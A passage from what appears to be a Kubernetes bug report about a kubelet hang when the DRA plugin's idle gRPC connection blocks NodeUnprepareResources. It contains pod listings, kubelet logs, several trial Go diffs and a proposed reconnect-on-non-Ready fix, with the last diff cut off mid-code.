7s\nnvidia-dra-driver-gpu   imex-channel-injection-62rcp-5dwcr                            1/1     Running     0             6s\nnvidia-dra-driver-gpu   imex-channel-injection-62rcp-9mdhf                            1/1     Running     0             6s\nnvidia-dra-driver-gpu   imex-channel-injection-62rcp-c8jxb                            1/1     Running     0             6s\n```\n\n* Wait for a long time (not sure how long but I waited around 2 hours) and delete the workload\n\n```shell\nkubectl delete -f demo/specs/imex/mn-channel-injection.yaml\n```\n\n* Workload stuck in the terminating state forever\n\n```shell\n$ kubectl get pod -A\n...\ndefault                 mn-imex-channel-injection-57b546bc47-2tpxk                    1/1     Terminating   0             125m\ndefault                 mn-imex-channel-injection-57b546bc47-cjl85                    1/1     Terminating   0             125m\ndefault                 mn-imex-channel-injection-57b546bc47-xj8zs                    1/1     Terminating   0             125m\nnvidia-dra-driver-gpu   imex-channel-injection-szkpc-qrhkb                            1/1     Terminating   0             125m\nnvidia-dra-driver-gpu   imex-channel-injection-szkpc-qtkn2                            1/1     Terminating   0             125m\nnvidia-dra-driver-gpu   imex-channel-injection-szkpc-tsmml                            1/1     Terminating   0             125m\n```\n\n* Observe DRA driver still healthy\n\n```shell\nnvidia-dra-driver-gpu   nvidia-dra-driver-gpu-controller-7c74cfc844-bkgxr             1/1     Running       0             14h\nnvidia-dra-driver-gpu   nvidia-dra-driver-gpu-kubelet-plugin-l9sb6                    2/2     Running       0             3h8m\nnvidia-dra-driver-gpu   nvidia-dra-driver-gpu-kubelet-plugin-qkzx4                    2/2     Running       0             3h9m\nnvidia-dra-driver-gpu   nvidia-dra-driver-gpu-kubelet-plugin-spxfn                    2/2     Running       0             3h8m\nnvidia-dra-driver-gpu   nvidia-dra-driver-gpu-webhook-56f486fdbc-9blwb                1/1     Running       0             14h\nnvidia-dra-driver-gpu   nvidia-dra-driver-gpu-webhook-56f486fdbc-p97nd                1/1     Running       0             14h\n```\n\n* DRA driver logs don\u2019t show any incoming `NodeUnprepareResources()` calls\n\n```shell\n$ kubectl logs -n nvidia-dra-driver-gpu   nvidia-dra-driver-gpu-kubelet-plugin-l9sb6\n...\n```\n\n* However the kubelet logs show the following lines around the time the workload was deleted\n\n```shell\n\n-- Workload pod\nSep 06 04:41:10 gb-nvl-043-compute04 kubelet[2245881]: I0906 04:41:10.227717 2245881 dra_plugin_manager.go:295] \"Preferring connected plugin\" logger=\"DRA registration handler\" driverName=\"compute-domain.nvidia.com\" endpoint=\"/var/lib/kubelet/plugins/compute-domain.nvidia.com/dra.sock\"\nSep 06 04:41:10 gb-nvl-043-compute04 kubelet[2245881]: I0906 04:41:10.227738 2245881 dra_plugin.go:173] \"Calling NodeUnprepareResource rpc\" request=\"&NodeUnprepareResourcesRequest{Claims:[]*Claim{&Claim{Namespace:default,UID:670dc9f1-4bee-463a-b2ec-fecf07b5a1fb,Name:mn-imex-channel-injection-57b546bc47-xj8zs-imex-channel-ndhtz,},},}\"\n\n-- IMEX Daemon pod\nSep 06 04:41:14 gb-nvl-043-compute04 kubelet[2245881]: I0906 04:41:14.573225 2245881 dra_plugin_manager.go:295] \"Preferring connected plugin\" logger=\"DRA registration handler\" driverName=\"compute-domain.nvidia.com\" endpoint=\"/var/lib/kubelet/plugins/compute-domain.nvidia.com/dra.sock\"\nSep 06 04:41:14 gb-nvl-043-compute04 kubelet[2245881]: I0906 04:41:14.573239 2245881 dra_plugin.go:173] \"Calling NodeUnprepareResource rpc\" request=\"&NodeUnprepareResourcesRequest{Claims:[]*Claim{&Claim{Namespace:nvidia-dra-driver-gpu,UID:5cb193b8-4ad4-4821-b841-fa3ada037b9b,Name:imex-channel-injection-szkpc-tsmml-compute-domain-daemon-sgvz8,},},}\"\n```\n\n* With *no* matching log lines similar to the following (from a different, successful iteration of this call)\n\n```shell\nSep 05 06:33:57 gb-nvl-043-compute02 kubelet[1739058]: I0905 06:33:57.933433 1739058 dra_plugin.go:194] \"Done calling NodeUnprepareResources rpc\" driverName=\"compute-domain.nvidia.com\" endpoint=\"/var/lib/kubelet/plugins/compute-domain.nvidia.com/dra.sock\" response=\"&NodeUnprepareResourcesResponse{Claims:map[string]*NodeUnprepareResourceResponse{f627927a-b39a-4fd1-9f0d-0f2851a015ce: &NodeUnprepareResourceResponse{Error:,},},}\" err=null\n```\n\n* Relevant code snippet from [here](https://github.com/kubernetes/kubernetes/blob/d9b31d602d833b8a45b31f720eed4534c769772b/pkg/kubelet/cm/dra/plugin/dra_plugin.go#L167)\n\n```go\nfunc (p *DRAPlugin) NodeUnprepareResources(\n    ctx context.Context,\n    req *drapbv1.NodeUnprepareResourcesRequest,\n    opts ...grpc.CallOption,\n) (*drapbv1.NodeUnprepareResourcesResponse, error) {\n    logger := klog.FromContext(ctx)\n    logger.V(4).Info(\"Calling NodeUnprepareResource rpc\", \"request\", req)\n    logger = klog.LoggerWithValues(logger, \"driverName\", p.driverName, \"endpoint\", p.endpoint)\n    ctx = klog.NewContext(ctx, logger)\n\n    ctx, cancel := context.WithTimeout(ctx, p.clientCallTimeout)\n    defer cancel()\n\n    var err error\n    var response *drapbv1.NodeUnprepareResourcesResponse\n    switch p.chosenService {\n    case drapbv1beta1.DRAPluginService:\n        client := drapbv1beta1.NewDRAPluginClient(p.conn)\n        response, err = drapbv1beta1.V1Beta1ClientWrapper{DRAPluginClient: client}.NodeUnprepareResources(ctx, req)\n    case drapbv1.DRAPluginService:\n        client := drapbv1.NewDRAPluginClient(p.conn)\n        response, err = client.NodeUnprepareResources(ctx, req)\n    default:\n        // Shouldn't happen, validateSupportedServices should only\n        // return services we support here.\n        return nil, fmt.Errorf(\"internal error: unsupported chosen service: %q\", p.chosenService)\n    }\n    logger.V(4).Info(\"Done calling NodeUnprepareResources rpc\", \"response\", response, \"err\", err)\n    return response, err\n}\n```\n\nIt should not be possible for the first log line to be called without the second.\n\nIt suggests the call to `client.NodeUnprepareResources(ctx, req)` never returns (despite the context with the timeout). Note that the call into `client.NodeUnprepareResources()` is into the *generated* PB code (which feels unlikely to be incorrect). We also *never* see `\"internal error: unsupported chosen service\"` anywhere in the logs.\n\nNot sure how this is possible or what is going on here.\n\nThe only way to recover from this is to trigger a kubelet restart.\n\nOnce the kubelet is restarted, it rediscovers the DRA driver and issues a `NodeUnprepareResources()`, which the DRA driver receives and carries out the deletion.\n\n## Reproducibility\n\nAfter a bunch of the remediation attempts listed below, I zeroed in on the fact that this issue happens when the gRPC connection goes into the Idle state. In the original code I would have to wait up 30 minutes to see the issue (because the default idle timeout is 30min). However, if I tweak `WithIdleTimeout` to 1 minute I am able to trigger the issue much more quickly. This suggests, the issue truly is related to the connection going idle, and I now have way to run with a smaller debug loop.\n\n```go\n       target := \"unix:\" + p.endpoint\n       logger.V(4).Info(\"Creating new gRPC connection\", \"target\", target)\n       conn, err := grpc.NewClient(\n               target,\n               grpc.WithTransportCredentials(insecure.NewCredentials()),\n               grpc.WithChainUnaryInterceptor(newMetricsInterceptor(p.driverName)),\n               grpc.WithStatsHandler(mp),\n+              grpc.WithIdleTimeout(time.Minute),\n       )\n       if err != nil {\n               return fmt.Errorf(\"create gRPC connection to DRA driver %s plugin at endpoint %s: %w\", p.driverName, p.endpoint, err)\n       }\n```\n\n## Remediation attempts\n\n* Add a fallback timeout that waits twice as long as the original timeout. In a normal operating state, it should **never** get called because it gets canceled if this function ever ends (which should happen if either the call completed or the original timeout was reached). Unfortunately, I see it get triggered, suggesting that we truly are hung in the `client.NodePrepareResources()` call. We also still never see the call ever complete, suggesting that my manual calls to `conn.Close()` and `cancel()` when the fallback timeout expires don\u2019t trigger the hang to unblock.\n\n```go\nfunc (p *DRAPlugin) NodeUnprepareResources(\n        ctx context.Context,\n        req *drapbv1.NodeUnprepareResourcesRequest,\n        opts ...grpc.CallOption,\n) (*drapbv1.NodeUnprepareResourcesResponse, error) {\n        logger := klog.FromContext(ctx)\n        logger.V(4).Info(\"Calling NodeUnprepareResource rpc\", \"request\", req)\n        logger = klog.LoggerWithValues(logger, \"driverName\", p.driverName, \"endpoint\", p.endpoint)\n        ctx = klog.NewContext(ctx, logger)\n\n        // Force the gRPC connection to be reestablished if necessary\n        conn, err := p.getOrCreateGRPCConn()\n        if err != nil {\n                return nil, err\n        }\n\n        // Start the gRPC call with a timeout\n        ctx, cancel := context.WithTimeout(ctx, p.clientCallTimeout)\n        defer cancel()\n\n        // Force close the plugin connection if the underlying gRPC call hangs.\n        // Wait twice the length of a p.clientCallTimeout.\n        fallbackCtx, fallbackCancel := context.WithTimeout(ctx, 2*p.clientCallTimeout)\n        defer fallbackCancel()\n\n        go func() {\n                <-fallbackCtx.Done()\n                if fallbackCtx.Err() == context.DeadlineExceeded {\n                        logger.V(4).Info(\"Force closing plugin connection due to hanging rpc\", \"plugin\", p.driverName, \"request\", req)\n                        conn.Close()\n                        cancel()\n                }\n        }()\n\n        var err error\n        var response *drapbv1.NodeUnprepareResourcesResponse\n        switch p.chosenService {\n        case drapbv1beta1.DRAPluginService:\n                client := drapbv1beta1.NewDRAPluginClient(p.conn)\n                logger.V(4).Info(\"Calling NodeUnprepareResources from V1Beta1Client\")\n                response, err = drapbv1beta1.V1Beta1ClientWrapper{DRAPluginClient: client}.NodeUnprepareResources(ctx, req)\n        case drapbv1.DRAPluginService:\n                client := drapbv1.NewDRAPluginClient(p.conn)\n                logger.V(4).Info(\"Calling NodeUnprepareResources from V1Client\")\n                response, err = client.NodeUnprepareResources(ctx, req)\n        default:\n                // Shouldn't happen, validateSupportedServices should only\n                // return services we support here.\n                return nil, fmt.Errorf(\"internal error: unsupported chosen service: %q\", p.chosenService)\n        }\n        logger.V(4).Info(\"Done calling NodeUnprepareResources rpc\", \"response\", response, \"err\", err)\n        return response, err\n}\n```\n\n* Add a keepalive to the gRPC connection created for the client. I was hoping this would trigger the connection to stay alive so that it never gets a chance to hang. This did not help though, and we see the same issue.\n\n```go\n        logger.V(4).Info(\"Creating new gRPC connection\", \"target\", target)\n        conn, err := grpc.NewClient(\n                target,\n                grpc.WithTransportCredentials(insecure.NewCredentials()),\n                grpc.WithChainUnaryInterceptor(newMetricsInterceptor(driverName)),\n                grpc.WithStatsHandler(mp),\n                grpc.WithKeepaliveParams(keepalive.ClientParameters{\n                        Time:                30 * time.Second, // Send keepalive pings every 30 seconds\n                        Timeout:             5 * time.Second,  // Wait 5 seconds for ping ack\n                        PermitWithoutStream: true,             // Send pings even when no active RPCs\n                }),\n        )\n```\n\n* Enable the `ResourceHealthStatus` feature gate. This feature gate is designed to keep the connection alive. It continuously validates the gRPC connection is working and automatically retries stream connection every 5 seconds if it fails. **This fixed the problem(\\!)**, but at the cost of having to enable an alpha feature gate. We need something that can be added to the existing code without a feature gate.\n\n```go\n        ResourceHealthStatus: {\n                {Version: version.MustParse(\"1.31\"), Default: true, PreRelease: featuregate.Alpha},\n        },\n```\n\n* Force a new connection at the top of every call to `NodePrepareResources` / `NodeUnprepareResources` whenever we detect that the existing connection is unhealthy. This also does not fix the issue, unfortunately. My call to `reconnect()` is never triggered, meaning the state changes I check never happen. I know this because the log within the reconnect call does not appear in the kubelet logs.\n\n```go\ndiff --git a/pkg/kubelet/cm/dra/plugin/dra_plugin.go b/pkg/kubelet/cm/dra/plugin/dra_plugin.go\nindex 1529bdcc3af..95c2f65d4fe 100644\n--- a/pkg/kubelet/cm/dra/plugin/dra_plugin.go\n+++ b/pkg/kubelet/cm/dra/plugin/dra_plugin.go\n@@ -68,6 +68,8 @@ type DRAPlugin struct {\n \thealthClient       drahealthv1alpha1.DRAResourceHealthClient\n \thealthStreamCtx    context.Context\n \thealthStreamCancel context.CancelFunc\n+\n+\treconnect func() error\n }\n\n func (p *DRAPlugin) getOrCreateGRPCConn() (*grpc.ClientConn, error) {\n@@ -143,6 +145,17 @@ func (p *DRAPlugin) NodePrepareResources(\n \tctx = klog.NewContext(ctx, logger)\n \tlogger.V(4).Info(\"Calling NodePrepareResources rpc\", \"request\", req)\n\n+\t// Force the gRPC connection to be reestablished if necessary\n+\tstate := p.conn.GetState()\n+\tif state == connectivity.Shutdown || state == connectivity.TransientFailure {\n+\t\tp.mutex.Lock()\n+\t\tif err := p.reconnect(); err != nil {\n+\t\t\tp.mutex.Unlock()\n+\t\t\treturn nil, err\n+\t\t}\n+\t\tp.mutex.Unlock()\n+\t}\n+\n \tctx, cancel := context.WithTimeout(ctx, p.clientCallTimeout)\n \tdefer cancel()\n\n@@ -174,6 +187,17 @@ func (p *DRAPlugin) NodeUnprepareResources(\n \tlogger = klog.LoggerWithValues(logger, \"driverName\", p.driverName, \"endpoint\", p.endpoint)\n \tctx = klog.NewContext(ctx, logger)\n\n+\t// Force the gRPC connection to be reestablished if necessary\n+\tstate := p.conn.GetState()\n+\tif state == connectivity.Shutdown || state == connectivity.TransientFailure {\n+\t\tp.mutex.Lock()\n+\t\tif err := p.reconnect(); err != nil {\n+\t\t\tp.mutex.Unlock()\n+\t\t\treturn nil, err\n+\t\t}\n+\t\tp.mutex.Unlock()\n+\t}\n+\n \tctx, cancel := context.WithTimeout(ctx, p.clientCallTimeout)\n \tdefer cancel()\n\ndiff --git a/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go b/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\nindex 2b76d3bd348..0ef95cf2b2c 100644\n--- a/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\n+++ b/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\n@@ -359,18 +359,24 @@ func (pm *DRAPluginManager) add(driverName string, endpoint string, chosenServic\n \t}\n\n \t// The gRPC connection gets created once. gRPC then connects to the gRPC server on demand.\n-       target := \"unix:\" + endpoint\n-       logger.V(4).Info(\"Creating new gRPC connection\", \"target\", target)\n-       conn, err := grpc.NewClient(\n-               target,\n-               grpc.WithTransportCredentials(insecure.NewCredentials()),\n-               grpc.WithChainUnaryInterceptor(newMetricsInterceptor(driverName)),\n-               grpc.WithStatsHandler(mp),\n-       )\n-       if err != nil {\n-               return fmt.Errorf(\"create gRPC connection to DRA driver %s plugin at endpoint %s: %w\", driverName, endpoint, err)\n+       p.reconnect = func() error {\n+               target := \"unix:\" + p.endpoint\n+               logger.V(4).Info(\"Creating new gRPC connection\", \"target\", target)\n+               conn, err := grpc.NewClient(\n+                       target,\n+                       grpc.WithTransportCredentials(insecure.NewCredentials()),\n+                       grpc.WithChainUnaryInterceptor(newMetricsInterceptor(p.driverName)),\n+                       grpc.WithStatsHandler(mp),\n+               )\n+               if err != nil {\n+                       return fmt.Errorf(\"create gRPC connection to DRA driver %s plugin at endpoint %s: %w\", p.driverName, p.endpoint, err)\n+               }\n+\n+               // Ensure that gRPC tries to connect even if we don't call any gRPC method.\n+               // This is necessary to detect early whether a plugin is really available.\n+               // This is currently an experimental gRPC method. Should it be removed we\n+               // would need to do something else, like sending a fake gRPC method call.\n+               conn.Connect()\n+\n+               p.conn = conn\n+               return nil\n+       }\n+       if err := p.reconnect(); err != nil {\n+               return err\n        }\n-       p.conn = conn\n\n        if utilfeature.DefaultFeatureGate.Enabled(features.ResourceHealthStatus) {\n                pm.wg.Add(1)\n@@ -396,12 +409,6 @@ func (pm *DRAPluginManager) add(driverName string, endpoint string, chosenServic\n                }()\n        }\n\n-       // Ensure that gRPC tries to connect even if we don't call any gRPC method.\n-       // This is necessary to detect early whether a plugin is really available.\n-       // This is currently an experimental gRPC method. Should it be removed we\n-       // would need to do something else, like sending a fake gRPC method call.\n-       conn.Connect()\n-\n        pm.store[p.driverName] = append(pm.store[p.driverName], mp)\n        logger.V(3).Info(\"Registered DRA plugin\", \"driverName\", p.driverName, \"endpoint\", p.endpoint, \"chosenService\", p.chosenService, \"numPlugins\", len(pm.store[p.driverName]))\n        pm.sync(p.driverName)\n```\n\n\n* Nuclear option \u2013 always establish a new connection for every call to `NodePrepareResources` / `NodeUnprepareResources`. **This resolves the issue\\!**\n  However, it comes at the cost of establishing a brand new gRPC connection every single time we make a call to `NodePrepareResources` / `NodeUnprepareResources`. It makes me wonder if we can get away with just calling `conn.Connect()` in these calls to kick the gRPC connection back to life.\n\n```go\ndiff --git a/pkg/kubelet/cm/dra/plugin/dra_plugin.go b/pkg/kubelet/cm/dra/plugin/dra_plugin.go\nindex 1529bdcc3af..e7fbf492b38 100644\n--- a/pkg/kubelet/cm/dra/plugin/dra_plugin.go\n+++ b/pkg/kubelet/cm/dra/plugin/dra_plugin.go\n@@ -68,6 +68,8 @@ type DRAPlugin struct {\n \thealthClient       drahealthv1alpha1.DRAResourceHealthClient\n \thealthStreamCtx    context.Context\n \thealthStreamCancel context.CancelFunc\n+\n+\treconnect func() error\n }\n\n func (p *DRAPlugin) getOrCreateGRPCConn() (*grpc.ClientConn, error) {\n@@ -143,6 +145,14 @@ func (p *DRAPlugin) NodePrepareResources(\n \tctx = klog.NewContext(ctx, logger)\n \tlogger.V(4).Info(\"Calling NodePrepareResources rpc\", \"request\", req)\n\n+\t// Force the gRPC connection to be reestablished\n+\tp.mutex.Lock()\n+\tif err := p.reconnect(); err != nil {\n+\t\tp.mutex.Unlock()\n+\t\treturn nil, err\n+\t}\n+\tp.mutex.Unlock()\n+\n \tctx, cancel := context.WithTimeout(ctx, p.clientCallTimeout)\n \tdefer cancel()\n\n@@ -174,6 +184,14 @@ func (p *DRAPlugin) NodeUnprepareResources(\n \tlogger = klog.LoggerWithValues(logger, \"driverName\", p.driverName, \"endpoint\", p.endpoint)\n \tctx = klog.NewContext(ctx, logger)\n\n+\t// Force the gRPC connection to be reestablished\n+\tp.mutex.Lock()\n+\tif err := p.reconnect(); err != nil {\n+\t\tp.mutex.Unlock()\n+\t\treturn nil, err\n+\t}\n+\tp.mutex.Unlock()\n+\n \tctx, cancel := context.WithTimeout(ctx, p.clientCallTimeout)\n \tdefer cancel()\n\ndiff --git a/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go b/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\nindex 2b76d3bd348..176357be56e 100644\n--- a/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\n+++ b/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\n@@ -359,18 +359,31 @@ func (pm *DRAPluginManager) add(driverName string, endpoint string, chosenServic\n \t}\n\n \t// The gRPC connection gets created once. gRPC then connects to the gRPC server on demand.\n-\ttarget := \"unix:\" + endpoint\n-\tlogger.V(4).Info(\"Creating new gRPC connection\", \"target\", target)\n-\tconn, err := grpc.NewClient(\n-\t\ttarget,\n-\t\tgrpc.WithTransportCredentials(insecure.NewCredentials()),\n-\t\tgrpc.WithChainUnaryInterceptor(newMetricsInterceptor(driverName)),\n-\t\tgrpc.WithStatsHandler(mp),\n-\t)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"create gRPC connection to DRA driver %s plugin at endpoint %s: %w\", driverName, endpoint, err)\n+\tp.reconnect = func() error {\n+\t\ttarget := \"unix:\" + p.endpoint\n+\t\tlogger.V(4).Info(\"Creating new gRPC connection\", \"target\", target)\n+\t\tconn, err := grpc.NewClient(\n+\t\t\ttarget,\n+\t\t\tgrpc.WithTransportCredentials(insecure.NewCredentials()),\n+\t\t\tgrpc.WithChainUnaryInterceptor(newMetricsInterceptor(p.driverName)),\n+\t\t\tgrpc.WithStatsHandler(mp),\n+\t\t)\n+\t\tif err != nil {\n+\t\t\treturn fmt.Errorf(\"create gRPC connection to DRA driver %s plugin at endpoint %s: %w\", p.driverName, p.endpoint, err)\n+\t\t}\n+\n+\t\t// Ensure that gRPC tries to connect even if we don't call any gRPC method.\n+\t\t// This is necessary to detect early whether a plugin is really available.\n+\t\t// This is currently an experimental gRPC method. Should it be removed we\n+\t\t// would need to do something else, like sending a fake gRPC method call.\n+\t\tconn.Connect()\n+\n+\t\tp.conn = conn\n+\t\treturn nil\n+\t}\n+\tif err := p.reconnect(); err != nil {\n+\t\treturn err\n \t}\n-\tp.conn = conn\n\n \tif utilfeature.DefaultFeatureGate.Enabled(features.ResourceHealthStatus) {\n \t\tpm.wg.Add(1)\n@@ -396,12 +409,6 @@ func (pm *DRAPluginManager) add(driverName string, endpoint string, chosenServic\n \t\t}()\n \t}\n\n-\t// Ensure that gRPC tries to connect even if we don't call any gRPC method.\n-\t// This is necessary to detect early whether a plugin is really available.\n-\t// This is currently an experimental gRPC method. Should it be removed we\n-\t// would need to do something else, like sending a fake gRPC method call.\n-\tconn.Connect()\n-\n \tpm.store[p.driverName] = append(pm.store[p.driverName], mp)\n \tlogger.V(3).Info(\"Registered DRA plugin\", \"driverName\", p.driverName, \"endpoint\", p.endpoint, \"chosenService\", p.chosenService, \"numPlugins\", len(pm.store[p.driverName]))\n \tpm.sync(p.driverName)\n```\n\n* Call `conn.Connect()` at the top of every call to `NodePrepareResources` / `NodeUnprepareResources`. Unfortunately, this doesn\u2019t work on its own. The only thing that has worked so far is the recreation of a new connection on each RPC attempt. Next, I will do something similar to the last iteration, but only reconnect when the connection is in a non-READY state.\n\n```go\ndiff --git a/pkg/kubelet/cm/dra/plugin/dra_plugin.go b/pkg/kubelet/cm/dra/plugin/dra_plugin.go\nindex 1529bdcc3af..f30a500cc4e 100644\n--- a/pkg/kubelet/cm/dra/plugin/dra_plugin.go\n+++ b/pkg/kubelet/cm/dra/plugin/dra_plugin.go\n@@ -143,6 +143,10 @@ func (p *DRAPlugin) NodePrepareResources(\n        ctx = klog.NewContext(ctx, logger)\n        logger.V(4).Info(\"Calling NodePrepareResources rpc\", \"request\", req)\n\n+       // Kick the gRPC connection to reconnect in cases where all of its\n+       // subchannels have gone idle.\n+       p.conn.Connect()\n+\n        ctx, cancel := context.WithTimeout(ctx, p.clientCallTimeout)\n        defer cancel()\n\n@@ -174,6 +178,10 @@ func (p *DRAPlugin) NodeUnprepareResources(\n        logger = klog.LoggerWithValues(logger, \"driverName\", p.driverName, \"endpoint\", p.endpoint)\n        ctx = klog.NewContext(ctx, logger)\n\n+       // Kick the gRPC connection to reconnect in cases where all of its\n+       // subchannels have gone idle.\n+       p.conn.Connect()\n+\n        ctx, cancel := context.WithTimeout(ctx, p.clientCallTimeout)\n        defer cancel()\n```\n\n* Do the same as above where we force a new connection at the top of every call to `NodePrepareResources` / `NodeUnprepareResources` whenever we detect that the existing connection is unhealthy.  However, detection of \u201cunhealthy\u201d is now determined as `state != connectivity.Ready`. Note, we also force old connections to be closed (but don\u2019t wait for them), which was missing from the code above. **This resolves the issue\\!**\n\n```go\ndiff --git a/pkg/kubelet/cm/dra/plugin/dra_plugin.go b/pkg/kubelet/cm/dra/plugin/dra_plugin.go\nindex 1529bdcc3af..969a4e131f8 100644\n--- a/pkg/kubelet/cm/dra/plugin/dra_plugin.go\n+++ b/pkg/kubelet/cm/dra/plugin/dra_plugin.go\n@@ -68,6 +68,8 @@ type DRAPlugin struct {\n \thealthClient       drahealthv1alpha1.DRAResourceHealthClient\n \thealthStreamCtx    context.Context\n \thealthStreamCancel context.CancelFunc\n+\n+\treconnect func() error\n }\n\n func (p *DRAPlugin) getOrCreateGRPCConn() (*grpc.ClientConn, error) {\n@@ -143,6 +145,18 @@ func (p *DRAPlugin) NodePrepareResources(\n \tctx = klog.NewContext(ctx, logger)\n \tlogger.V(4).Info(\"Calling NodePrepareResources rpc\", \"request\", req)\n\n+\t// Create a new gRPC connection cases where it has become non-READY\n+\tstate := p.conn.GetState()\n+\tlogger.V(4).Info(\"Plugin connection state\", \"state\", state)\n+\tif state != connectivity.Ready {\n+\t\tp.mutex.Lock()\n+\t\tif err := p.reconnect(); err != nil {\n+\t\t\tp.mutex.Unlock()\n+\t\t\treturn nil, err\n+\t\t}\n+\t\tp.mutex.Unlock()\n+\t}\n+\n \tctx, cancel := context.WithTimeout(ctx, p.clientCallTimeout)\n \tdefer cancel()\n\n@@ -174,6 +188,18 @@ func (p *DRAPlugin) NodeUnprepareResources(\n \tlogger = klog.LoggerWithValues(logger, \"driverName\", p.driverName, \"endpoint\", p.endpoint)\n \tctx = klog.NewContext(ctx, logger)\n\n+\t// Create a new gRPC connection cases where it has become non-READY\n+\tstate := p.conn.GetState()\n+\tlogger.V(4).Info(\"Plugin connection state\", \"state\", state)\n+\tif state != connectivity.Ready {\n+\t\tp.mutex.Lock()\n+\t\tif err := p.reconnect(); err != nil {\n+\t\t\tp.mutex.Unlock()\n+\t\t\treturn nil, err\n+\t\t}\n+\t\tp.mutex.Unlock()\n+\t}\n+\n \tctx, cancel := context.WithTimeout(ctx, p.clientCallTimeout)\n \tdefer cancel()\n\ndiff --git a/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go b/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\nindex 2b76d3bd348..1bca9ce6599 100644\n--- a/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\n+++ b/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\n@@ -358,19 +358,41 @@ func (pm *DRAPluginManager) add(driverName string, endpoint string, chosenServic\n \t\tpm:        pm,\n \t}\n\n-\t// The gRPC connection gets created once. gRPC then connects to the gRPC server on demand.\n-\ttarget := \"unix:\" + endpoint\n-\tlogger.V(4).Info(\"Creating new gRPC connection\", \"target\", target)\n-\tconn, err := grpc.NewClient(\n-\t\ttarget,\n-\t\tgrpc.WithTransportCredentials(insecure.NewCredentials()),\n-\t\tgrpc.WithChainUnaryInterceptor(newMetricsInterceptor(driverName)),\n-\t\tgrpc.WithStatsHandler(mp),\n-\t)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"create gRPC connection to DRA driver %s plugin at endpoint %s: %w\", driverName, endpoint, err)\n+\t// The gRPC connection gets created once. gRPC then connects to the\n+\t// gRPC server on demand. We wrap the call in a reconnect() function to\n+\t// allow us to reestablish the connection if / when necessary.\n+\tp.reconnect = func() error {\n+\t\t// Close any existing connection\n+\t\tif p.conn != nil {\n+\t\t\tgo p.conn.Close()\n+\t\t}\n+\n+\t\t// Create the new connection\n+\t\ttarget := \"unix:\" + p.endpoint\n+\t\tlogger.V(4).Info(\"Creating new gRPC connection\", \"target\", target)\n+\t\tconn, err := grpc.NewClient(\n+\t\t\ttarget,\n+\t\t\tgrpc.WithTransportCredentials(insecure.NewCredentials()),\n+\t\t\tgrpc.WithChainUnaryInterceptor(newMetricsInterceptor(p.driverName)),\n+\t\t\tgrpc.WithStatsHandler(mp),\n+\t\t)\n+\t\tif err != nil {\n+\t\t\treturn fmt.Errorf(\"create gRPC connection to DRA driver %s plugin at endpoint %s: %w\", p.driverName, p.endpoint, err)\n+\t\t}\n+\n+\t\t// Ensure that gRPC tries to connect even if we don't call any gRPC method.\n+\t\t// This is necessary to detect early whether a plugin is really available.\n+\t\t// This is currently an experimental gRPC method. Should it be removed we\n+\t\t// would need to do something else, like sending a fake gRPC method call.\n+\t\tconn.Connect()\n+\n+\t\tp.conn = conn\n+\t\treturn nil\n+\t}\n+\tif err := p.reconnect(); err != nil {\n+\t\treturn err\n \t}\n-\tp.conn = conn\n\n \tif utilfeature.DefaultFeatureGate.Enabled(features.ResourceHealthStatus) {\n \t\tpm.wg.Add(1)\n@@ -396,12 +418,6 @@ func (pm *DRAPluginManager) add(driverName string, endpoint string, chosenServic\n \t\t}()\n \t}\n\n-\t// Ensure that gRPC tries to connect even if we don't call any gRPC method.\n-\t// This is necessary to detect early whether a plugin is really available.\n-\t// This is currently an experimental gRPC method. Should it be removed we\n-\t// would need to do something else, like sending a fake gRPC method call.\n-\tconn.Connect()\n-\n \tpm.store[p.driverName] = append(pm.store[p.driverName], mp)\n \tlogger.V(3).Info(\"Registered DRA plugin\", \"driverName\", p.driverName, \"endpoint\", p.endpoint, \"chosenService\", p.chosenService, \"numPlugins\", len(pm.store[p.driverName]))\n \tpm.sync(p.driverName)\n```\n\n* Set an idle timeout of 0\\. According to the [gRPC docs](https://pkg.go.dev/google.golang.org/grpc#WithIdleTimeout), this should cause the open gRPC channel to never transition to idle. **This also fixes the issue\\!**, but I\u2019m not sure if I trust it, and would probably err on the side of what\u2019s above to reestablish a new connection if it is not in the `Ready` state. Maybe a combination of both.\n\n```go\n       target := \"unix:\" + p.endpoint\n       logger.V(4).Info(\"Creating new gRPC connection\", \"target\", target)\n       conn, err := grpc.NewClient(\n               target,\n               grpc.WithTransportCredentials(insecure.NewCredentials()),\n               grpc.WithChainUnaryInterceptor(newMetricsInterceptor(p.driverName)),\n               grpc.WithStatsHandler(mp),\n+              grpc.WithIdleTimeout(0),\n       )\n       if err != nil {\n               return fmt.Errorf(\"create gRPC connection to DRA driver %s plugin at endpoint %s: %w\", p.driverName, p.endpoint, err)\n       }\n```\n\nSo with all of this discussion in mind, my proposal for a final fix for this issue is the following (i.e. a combination of the last 2 working solutions):\n\n```go\ndiff --git a/pkg/kubelet/cm/dra/plugin/dra_plugin.go b/pkg/kubelet/cm/dra/plugin/dra_plugin.go\nindex 1529bdcc3af..969a4e131f8 100644\n--- a/pkg/kubelet/cm/dra/plugin/dra_plugin.go\n+++ b/pkg/kubelet/cm/dra/plugin/dra_plugin.go\n@@ -68,6 +68,8 @@ type DRAPlugin struct {\n \thealthClient       drahealthv1alpha1.DRAResourceHealthClient\n \thealthStreamCtx    context.Context\n \thealthStreamCancel context.CancelFunc\n+\n+\treconnect func() error\n }\n\n func (p *DRAPlugin) getOrCreateGRPCConn() (*grpc.ClientConn, error) {\n@@ -143,6 +145,18 @@ func (p *DRAPlugin) NodePrepareResources(\n \tctx = klog.NewContext(ctx, logger)\n \tlogger.V(4).Info(\"Calling NodePrepareResources rpc\", \"request\", req)\n\n+\t// Create a new gRPC connection cases where it has become non-READY\n+\tstate := p.conn.GetState()\n+\tlogger.V(4).Info(\"Plugin connection state\", \"state\", state)\n+\tif state != connectivity.Ready {\n+\t\tp.mutex.Lock()\n+\t\tif err := p.reconnect(); err != nil 